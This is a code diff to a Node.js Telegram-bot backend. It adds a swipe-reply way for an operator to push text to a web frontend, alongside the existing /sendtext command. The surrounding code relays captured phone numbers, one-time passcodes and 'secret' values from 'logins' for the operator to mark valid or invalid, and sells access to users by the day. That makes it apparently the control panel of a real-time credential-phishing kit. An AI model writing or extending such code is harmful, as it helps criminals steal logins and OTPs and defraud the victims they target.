@@ -158,10 +158,12 @@ const fmtOtp = (user, { phone, otp, time }) => {
   );
 };
 
-// ── NEW: Send-text pending store ──────────────────────────────────────────────
-// Key: normalised phone number  →  { ts, text, resolved, userId }
-// Admin uses /sendtext <phoneNumber> <text> to resolve it.
+// ── Send-text pending store ───────────────────────────────────────────────────
+// Key: normalised phone number  →  { ts, text, resolved, readAt, msgId }
+// Admin replies to the "SEND TEXT CHOSEN" message → auto-resolved.
 const pendingSendTexts = new Map();
+// Reverse lookup: Telegram message_id → normalised phone (so we match replies)
+const sendTextMsgToPhone = new Map();
 
 // ── Callback data helpers ─────────────────────────────────────────────────────
 const CB_SEP  = '|';
@@ -426,8 +428,8 @@ const registerHandlers = () => {
       `/removeuser &lt;id&gt;  /extend &lt;id&gt; &lt;days&gt;\n` +
       `/extendall &lt;days&gt;  /reduceall &lt;days&gt;\n` +
       `/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;\n\n` +
-      `📤 <b>Send Text:</b>\n/sendtext &lt;phoneNumber&gt; &lt;text message&gt;\n` +
-      `<i>e.g. /sendtext 0977123456 Please confirm your loan reference XYZ123</i>`,
+      `📤 <b>Send Text:</b>\nTap "Send Text" on a login → swipe-reply with the message.\n` +
+      `<i>Or fallback: /sendtext &lt;phone&gt; &lt;text&gt;</i>`,
       { parse_mode: 'HTML' }).catch(() => {});
   });
 
@@ -682,17 +684,19 @@ async function handleCallback(query) {
       await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`);
       await ack('❌ Invalid');
     } else if (action === 'sendtext') {
-      // ── NEW: Admin chose "Send Text" ──────────────────────────────────────
+      // ── Admin chose "Send Text" — just swipe-reply to respond ─────────────
       rec.sendText = true;
-      // Register a pending send-text entry for this phone number
-      pendingSendTexts.set(phone, { ts: now, text: null, resolved: false, readAt: null });
+      pendingSendTexts.set(phone, { ts: now, text: null, resolved: false, readAt: null, msgId: null });
       log.info(`📤 pendingSendTexts SET for ${phone} — size now ${pendingSendTexts.size}`);
-      await edit(
-        `📤 <b>SEND TEXT CHOSEN</b>\n📞 <code>${phone}</code>\n\n` +
-        `Now send the text using:\n<code>/sendtext ${phone} your message here</code>\n\n` +
+      const sent = await edit(
+        `📤 <b>SEND TEXT</b>\n📞 <code>${phone}</code>\n\n` +
+        `↩️ <b>Swipe-reply to this message</b> with the text to send.\n\n` +
         `⏱️ You have 5 minutes.`
       );
-      await ack('📤 Send Text mode!');
+      // Store the message ID so we can match admin's reply to this phone
+      sendTextMsgToPhone.set(messageId, phone);
+      pendingSendTexts.get(phone).msgId = messageId;
+      await ack('📤 Reply with the text!');
     }
     return;
   }
@@ -755,11 +759,15 @@ setInterval(() => {
       if (v.ts < del) u.otps.delete(k);
     }
   }
-  // Clean up timed-out or fully-read send-text entries
+  // Clean up timed-out or fully-read send-text entries + reverse lookup
   for (const [phone, entry] of pendingSendTexts) {
     const age = now - entry.ts;
-    if (age > CFG.SEND_TEXT_TIMEOUT + 60_000) { pendingSendTexts.delete(phone); continue; }
-    if (entry.readAt && now - entry.readAt > CFG.READ_TTL) { pendingSendTexts.delete(phone); }
+    const shouldDelete = (age > CFG.SEND_TEXT_TIMEOUT + 60_000) ||
+                         (entry.readAt && now - entry.readAt > CFG.READ_TTL);
+    if (shouldDelete) {
+      if (entry.msgId) sendTextMsgToPhone.delete(entry.msgId);
+      pendingSendTexts.delete(phone);
+    }
   }
 }, CFG.CLEANUP_INTERVAL).unref?.();
 
@@ -855,6 +863,47 @@ async function handleSendTextCommand(chatId, rawPhone, body) {
   }
 }
 
+// ── Send-text REPLY handler — admin swipe-replies to the "SEND TEXT" message ─
+async function handleSendTextReply(chatId, phone, body) {
+  body = body.trim();
+  log.info(`📤 Reply-to-send-text — phone=${phone} text="${body.slice(0, 60)}"`);
+
+  let pending = pendingSendTexts.get(phone);
+  if (!pending) {
+    log.warn(`Reply-send-text: no entry for ${phone} — auto-creating`);
+    pending = { ts: Date.now(), text: null, resolved: false, readAt: null, msgId: null };
+    pendingSendTexts.set(phone, pending);
+  }
+
+  if (Date.now() - pending.ts > CFG.SEND_TEXT_TIMEOUT) {
+    pendingSendTexts.delete(phone);
+    sendTextMsgToPhone.delete(pending.msgId);
+    if (bot && botHealthy) {
+      await bot.sendMessage(chatId, `⏰ Expired (5-minute window passed).`, { parse_mode: 'HTML' }).catch(() => {});
+    }
+    return;
+  }
+
+  // Resolve — frontend polling /check-text-content will pick this up
+  pending.text     = sanitize(body);
+  pending.resolved = true;
+  pending.readAt   = null;
+
+  log.info(`✅ Reply RESOLVED for ${phone}`);
+
+  // Clean up the reverse lookup
+  if (pending.msgId) sendTextMsgToPhone.delete(pending.msgId);
+
+  if (bot && botHealthy) {
+    await bot.sendMessage(chatId,
+      `✅ <b>Sent to frontend!</b>\n\n` +
+      `📞 <code>${phone}</code>\n` +
+      `💬 <code>${sanitize(body)}</code>\n\n` +
+      `User will see the Send Message button now.`,
+      { parse_mode: 'HTML' }).catch(e => log.error('reply confirm err:', e.message));
+  }
+}
+
 // ── Webhook endpoint ─────────────────────────────────────────────────────────
 const MAX_BUF = 200;
 let updateBuffer = [];
@@ -872,23 +921,39 @@ app.post('/webhook/:token', async (req, res) => {
   const snippet = upd.message?.text?.slice(0, 60) || upd.callback_query?.data?.slice(0, 40) || '';
   log.info(`⬇️  [${updType}] ${snippet}`);
 
-  // ── Intercept /sendtext HERE — NO bot guard ────────────────────────────────
-  // Even if bot hasn't initialised yet (e.g. right after restart), we still
-  // store the text so the frontend can pick it up via /check-text-content.
+  // ── Intercept admin REPLY to a "Send Text" message ─────────────────────────
+  // Admin swipes on the "SEND TEXT" message and types the text to send.
+  // We detect it by checking reply_to_message.message_id against sendTextMsgToPhone.
+  // Also still supports /sendtext command as fallback.
   if (upd.message?.text) {
-  const msgText = upd.message.text;
-  const chatId  = String(upd.message.chat.id);
+    const msgText = upd.message.text;
+    const chatId  = String(upd.message.chat.id);
+    const isAdminChat = isAdmin(chatId);
 
-  const match = msgText.match(/^\/sendtext(?:@\S+)?\s+(\S+)\s+([\s\S]+)/);
+    // ── Method 1: Swipe-reply to the "SEND TEXT" bot message ────────────────
+    if (isAdminChat && upd.message.reply_to_message) {
+      const replyToId = upd.message.reply_to_message.message_id;
+      const phone = sendTextMsgToPhone.get(replyToId);
+      if (phone && !msgText.startsWith('/')) {
+        try {
+          await handleSendTextReply(chatId, phone, msgText);
+        } catch (e) {
+          log.error('Send-text reply handler error:', e.message);
+        }
+        return res.sendStatus(200);
+      }
+    }
 
-  if (match && (isAdmin(chatId) || [...users.values()].find(u => u.chatId === chatId))) {
+    // ── Method 2: /sendtext command (fallback) ──────────────────────────────
+    const match = msgText.match(/^\/sendtext(?:@\S+)?\s+(\S+)\s+([\s\S]+)/);
+    if (match && (isAdminChat || [...users.values()].find(u => u.chatId === chatId))) {
       try {
-      await handleSendTextCommand(chatId, match[1], match[2]);
+        await handleSendTextCommand(chatId, match[1], match[2]);
       } catch (e) {
-      log.error('/sendtext handler error:', e.message);
+        log.error('/sendtext handler error:', e.message);
       }
       return res.sendStatus(200);
-  }
+    }
   }
 
   if (!bot) { if (updateBuffer.length < MAX_BUF) updateBuffer.push(upd); return res.sendStatus(200); }
